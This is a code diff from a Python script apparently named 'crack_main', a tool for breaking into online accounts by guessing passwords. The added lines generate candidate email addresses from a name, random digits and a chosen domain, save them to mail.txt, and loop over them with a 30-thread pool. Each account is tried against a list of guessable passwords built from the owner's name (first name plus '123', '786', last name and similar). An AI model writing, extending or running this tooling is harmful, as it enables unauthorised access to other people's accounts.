@@ -401,7 +401,22 @@ class crack_main():
                 domain = input(" Domain : ")
                 print("\n [?] Limit ids Example 1000,5000,50000")
                 limit = int(input(" Limit Ids : "))
-                for user in fo:
+                for nmbr in range(limit):
+                        lchoice = random.choice(lists)
+                        if '3' in lchoice:
+                                mail = ''.join(random.choice(string.digits) for _ in range(3))
+                                open('mail.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
+                        else:
+                                mail = ''.join(random.choice(string.digits) for _ in range(4))
+                                open('mail.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
+                        zia = open('mail.txt', 'r').read().splitlines()
+                with ThreadPool(max_workers=30) as formSubmit:
+                        total = str(len(fo))
+                        clear()
+                        print(' Total account : \033[1;32m'+total)
+                        print("\033[1;37m \x1b[38;5;208mUse flight mode for speed up\033[1;37m")
+                        linex()
+                        for user in zia:
                                 ids,names = user.split('|')
                                 first_name = names.rsplit(' ')[0]
                                 try:
@@ -411,8 +426,6 @@ class crack_main():
                                 fs = first_name.lower()
                                 ls = last_name.lower()
                                 passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122',fs,fs+'1234',fs+'786',fs+'12']
-                        naseeb = open('mail.txt','a').write(nmp)
-                self.id = open('mail.txt').read().splitlines()
                 self.pasw()
         def cracknum(self,id):
                 global methods
